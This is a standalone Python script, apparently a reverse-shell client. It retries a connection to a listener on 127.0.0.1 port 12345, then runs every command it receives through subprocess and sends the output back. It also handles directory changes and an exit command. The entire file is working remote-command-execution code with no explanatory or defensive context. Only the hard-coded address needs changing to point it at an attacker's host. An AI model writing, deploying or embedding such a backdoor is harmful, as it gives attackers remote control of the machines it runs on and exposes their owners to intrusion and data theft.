#!/usr/bin/python3

import socket
import subprocess
import os

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        client.connect(("127.0.0.1", 12345))
        break
    except ConnectionRefusedError:
        pass

try:
    while True:
        pwd = subprocess.getoutput("pwd")
        client.send(pwd.encode())
        cmd = (client.recv(1024)).decode()
        if cmd == "exit()":
            break
        elif cmd.startswith("cd "):
            directory = cmd.split(" ", 1)[1]
            try:
                os.chdir(directory)
                output = f"Changed directory to: {directory}"
            except FileNotFoundError:
                output = f"Directory '{directory}' not found"
            except PermissionError:
                output = f"Permission denied to access directory '{directory}'"
        else:
            output = subprocess.getoutput(cmd)
        output += "\nEND_OF_OUTPUT\n"
        client.send(output.encode())
except KeyboardInterrupt:
    print("\nExiting due to KeyboardInterrupt.")
except BrokenPipeError:
    print("\nServer closed the connection.")
finally:
    client.close()
